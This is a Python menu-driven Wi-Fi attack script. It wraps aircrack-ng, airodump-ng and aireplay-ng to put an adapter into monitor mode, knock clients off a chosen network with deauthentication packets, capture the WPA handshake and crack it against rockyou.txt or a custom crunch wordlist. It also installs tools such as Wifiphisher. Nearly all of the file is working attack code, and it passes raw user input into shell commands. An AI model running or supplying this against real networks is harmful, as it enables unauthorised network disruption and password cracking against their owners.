import os
import time
from functions import banner
from termcolor import colored

enter = "\n"

def menu():
    os.system("clear")

    print(colored(f"{banner()}", "red"))

    print("*** The Script was Created By TraiLeR (Idan) ***{0}".format(enter))

    print("""Menu:
    (1) Enable Monitor Mode
    (2) Disable Monitor Mode
    (3) Scan Networks
    (4) Getting Handshake
    (5) Update & Upgrade Machine
    (6) Install wireless tools (Type 5 before)
    (7) Crack Wi-Fi with rockyou.txt
    (8) Crack Wi-Fi with wordlist (Any)
    (9) Create a wordlist (Crunch Needed)
    (10) About the Hacker
    (11) Exit""")

    option = int(input("{0}Choice > ".format(enter)))

    if option == 11:
        exit()

    elif option == 10:
        print("""
Hi, my name is Idan (TraiLeR) and I am an Ethical Hacker, Bug Bounty Hunter and Cyber Security Researcher.
Since I was a child I loved challenges and do things that would open my mind and be more creative.
Feel free to reach me on LinkedIn:
https://www.linkedin.com/in/idan-malihi-b993611aa/

OR

Feel free to reach me on Telegram:
@TraiLeR30
        """)

    elif option == 1:
        print("Set up the adapter{0}".format(enter))
        adapter = input("Enter your adapter's name > ")
        os.system("ifconfig {0} down && iwconfig {0} mode monitor && ifconfig {0} up && airmon-ng check kill".format(adapter))
        menu()

    elif option == 2:
        adapter = input("Enter your adapter's name > ")
        os.system("airmon-ng stop {0} && service network-manager restart".format(adapter))
        menu()

    elif option == 3:
        adapter = input("Enter your adapter's name > ")
        scan = "airodump-ng {0} -M".format(adapter)
        print("Press CTRL + C When you Finish the SCAN! *IMPORTANT* ")
        time.sleep(5)
        os.system(scan)
        time.sleep(5)
        menu()

    elif option == 4:
        adapter = input("Enter your adapter's name > ")
        scan = "airodump-ng {0} -M".format(adapter)
        print("Press CTRL + C When you Finish the SCAN! *IMPORTANT* ")
        time.sleep(5)
        os.system(scan)
        bssid = str(input("\nEnter Target's BSSID > "))
        channel = int(input("\nEnter Network's Channel > "))
        path = str(input("\nEnter Network's Channel > "))
        packet = int(input("Enter the number of packets > "))
        attack = "airodump-ng {} --bssid {} -c {} -w {} | xterm -e aireplay-ng -0 {} -a {} {}".format(adapter,bssid,channel,path,packet,bssid,adapter)
        os.system(attack)
        menu()

    elif option == 5:
        os.system("sudo apt-get update && sudo apt-get full-upgrade -y")
        menu()

    elif option == 6:
        os.system("clear")
        print("""
(1) Aircrack-ng
(2) Wifite
(3) Kismet
(4) Wifiphisher
(5) inSSIDer
(6) Wireshark
(7) Airgeddon
(8) Wifi Honey
(9) Crunch
(10) Install ALL
            """)

        tool = int(input("Enter the number of the tool > "))

        try:
            if tool == 1:
                os.system("sudo apt-get update && sudo apt-get install aircrack-ng -y")

            elif tool == 2:
                os.system("sudo apt-get update && sudo apt-get install wifite -y")

            elif tool == 3:
                os.system("sudo apt-get update && sudo apt-get install kismet -y")

            elif tool == 4:
                os.system("sudo apt-get update && sudo apt-get install wifiphisher -y")

            elif tool == 5:
                os.system("sudo apt-get update && sudo apt-get install linssid -y")

            elif tool == 6:
                os.system("sudo apt-get update && sudo apt-get install wireshark -y")

            elif tool == 7:
                os.system("sudo apt-get update && sudo apt-get install airgeddon -y")

            elif tool == 8:
                os.system("sudo apt-get update && sudo apt-get install wifitap")

            elif tool == 9:
                os.system("sudo apt-get update && sudo apt-get install -y crunch")

            elif tool == 10:
                os.system("sudo apt-get update && sudo apt-get install -y aircrack-ng wifite kismet wifiphisher linssid wireshark airgeddon wifitap")

        except:
            print("You did not type the right number on the list!")

    elif option == 7:
        if os.path.exists("/usr/share/wordlists/rockyou.txt"):
            handshake = str(input("Enter the path of the handshake file > "))
            print("{0}To exit Press CTRL +C".format(enter))
            os.system("aircrack-ng {0} -w /usr/share/wordlists/rockyou.txt".format(handshake))
            time.sleep(5)
            exit()

        elif not os.path.exists("/usr/share/wordlists/rockyou.txt"):
            os.system("gzip -d /usr/share/wordlists/rockyou.txt.gz")
            handshake = str(input("Enter the path of the handshake file > "))
            print("{0}To exit Press CTRL +C".format(enter))
            os.system("aircrack-ng {0} -w /usr/share/wordlists/rockyou.txt".format(handshake))
            time.sleep(5)
            exit()

    elif option == 8:
        handshake = str(input("Enter the path of the handshake file > "))
        wordlist = str(input("Enter the path of the wordlist file > "))
        os.system("aircrack-ng {0} -w {1}".format(handshake, wordlist))

    elif option == 9:
        if os.system("crunch") == "Usage":
            print("""Crunch can create a wordlist based on criteria you specify.
            The output from crunch can be sent to the screen, file or another program.
            
            Usage: crunch <Min> <Max> <Characters> -t <Pattern> -o <FileName>
            
            Example:
            crunch 6 8 123abc$ -o wordlist -t a@@@@b""")

            min = int(input("Minimum of characters > "))
            max = int(input("Maximum of characters > "))
            characters = input("Characters > ")
            pattern = input("Pattern (Example: a@@@@b) > ")
            output = str(input("File Name > "))

            os.system("crunch {0} {1} {2} -o {3} -t {4}".format(min, max, characters, pattern, output))
            print("Your new wordlist saved in {0}".format(output))

        elif not os.system("crunch") == "Usage":
            print("Installing Crunch{0}".format(enter))

            print("""Crunch can create a wordlist based on criteria you specify.
The output from crunch can be sent to the screen, file or another program.

Usage: crunch <Min> <Max> <Characters> -t <Pattern> -o <FileName>

Example:
crunch 6 8 123abc$ -o wordlist -t a@@@@b""")

            min = int(input("Minimum of characters > "))
            max = int(input("Maximum of characters > "))
            characters = input("Characters > ")
            pattern = input("Pattern (Example: a@@@@b) > ")
            output = str(input("File Name > "))

            os.system("crunch {0} {1} {2} -o {3} -t {4}".format(min, max, characters, pattern, output))
            print("Your new wordlist saved in {0}".format(output))


menu()
